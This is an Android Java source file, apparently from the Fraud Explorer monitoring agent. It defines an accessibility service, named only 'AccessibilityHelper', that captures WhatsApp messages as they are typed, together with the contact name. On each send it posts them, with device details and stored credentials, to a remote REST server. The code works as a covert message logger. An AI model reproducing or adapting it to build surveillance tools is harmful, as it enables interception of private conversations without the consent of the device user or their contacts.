/*
 * The Fraud Explorer
 * https://www.thefraudexplorer.com/
 *
 * Copyright (c) 2014-2019 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * https://www.thefraudexplorer.com/License
 *
 * Date: 2019-06
 * Revision: v0.0.2-ai
 *
 * Description: Accessibility
 */

package com.nf.thefraudexplorer;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AccessibilityHelper extends AccessibilityService
{
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event)
    {
        final int eventType = event.getEventType();
        AccessibilityNodeInfo nodeInfo = event.getSource();
        String eventText = null, applicationName = null;
        Context context = GlobalApplication.getAppContext();

        try
        {
            switch (eventType)
            {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:

                    eventText = event.getText().toString();

                    /* WhatsApp */

                    if (event.getPackageName().toString().contains("whatsapp"))
                    {
                        if (eventText.toLowerCase().contains("type a message") || eventText.toLowerCase().contains("escribe un mensaje")) Utilities.finalChatMessage = null;
                        if (eventText != null && !eventText.toLowerCase().contains("type a message") && !eventText.toLowerCase().contains("escribe un mensaje")) Utilities.finalChatMessage = eventText;
                    }

                    break;
            }

            if (nodeInfo == null) return;
            nodeInfo.refresh();

            if (Settings.analyticsStatus(context).contains("enabled"))
            {
                /* Get WhatsApp contact name */

                try
                {
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = nodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");

                    if (findAccessibilityNodeInfosByViewId.size() > 0)
                    {
                        AccessibilityNodeInfo parent = (AccessibilityNodeInfo) findAccessibilityNodeInfosByViewId.get(0);
                        String contactName = parent.getText().toString();

                        if (contactName != null && !contactName.isEmpty()) Utilities.finalChatContact = contactName;
                    }
                }
                catch (Exception contactName) {}

                /* Start main Logic */

                if (nodeInfo.getViewIdResourceName() != null)
                {
                    /* When to send the message if WhatsApp*/

                    if (event.getPackageName().toString().contains("whatsapp"))
                    {
                        // Log.d("[TFE-DEBUG] : ", nodeInfo.getViewIdResourceName().toString());

                        /* Query remote analytics status */

                        if (nodeInfo.getViewIdResourceName().toString().contains(":id/back"))
                        {
                            Utilities.getRemoteAnalyticsStatus();
                        }

                        /* Catch send event */

                        if (nodeInfo.getViewIdResourceName().toString().contains(":id/date"))
                        {
                            if (Utilities.finalChatMessage != null && Utilities.finalChatMessage.length() > 3)
                            {
                                /* Get Package Name into applicationName variable*/

                                final PackageManager pm = getApplicationContext().getPackageManager();
                                ApplicationInfo ai;

                                try
                                {
                                    ai = pm.getApplicationInfo(event.getPackageName().toString(), 0);
                                }
                                catch (final PackageManager.NameNotFoundException e)
                                {
                                    ai = null;
                                }

                                /* Get Application Name  */

                                applicationName = (String) (ai != null ? pm.getApplicationLabel(ai) : "(unknown)");
                                applicationName = applicationName + " - Chat with " + Utilities.finalChatContact;

                                /* Report Activity */

                                Utilities.reportOnline(Cryptography.encrypt(Settings.agentID(context), "general"), Cryptography.encrypt(android.os.Build.VERSION.RELEASE, "general"), Cryptography.encrypt(Settings.agentVersion(context), "general"), Cryptography.encrypt(Settings.serverPassword(context), "general"), Cryptography.encrypt(Settings.companyDomain(context), "general"));

                                /* Sanitization & Send Message */

                                Utilities.messageSanitizer();

                                // Log.d("[TFE-SEND-REST] : ", "[" + Utilities.getLocalIpAddress() + "]" + "[" + Settings.agentID(context) + "]" + "[" + applicationName + "]: " + Utilities.finalChatMessage);

                                Utilities.sendRESTData(Settings.agentID(context), Utilities.getLocalIpAddress(), Settings.companyDomain(context), applicationName, Settings.RESTusername(context), Settings.RESTpassword(context), Utilities.finalChatMessage);

                                /* Flush Data */

                                Utilities.finalChatMessage = null;
                            }
                        }
                    }
                }
            }
            else
            {
                if (nodeInfo.getViewIdResourceName() != null)
                {
                    if (event.getPackageName().toString().contains("whatsapp"))
                    {
                        /* Query remote analytics status */

                        if (nodeInfo.getViewIdResourceName().toString().contains(":id/back"))
                        {
                            Utilities.getRemoteAnalyticsStatus();
                        }
                    }
                }
            }
        }
        catch(Exception ex)
        {
            Utilities.appLog("ERROR : Accessibility Event : " + ex.toString());
            Log.d("[TFE-ACCSS-EX]: ", ex.toString());
        }
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onServiceConnected()
    {
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        this.setServiceInfo(info);

        // Log.d("[TFE-DEBUG] : ", "Service connected");
    }
}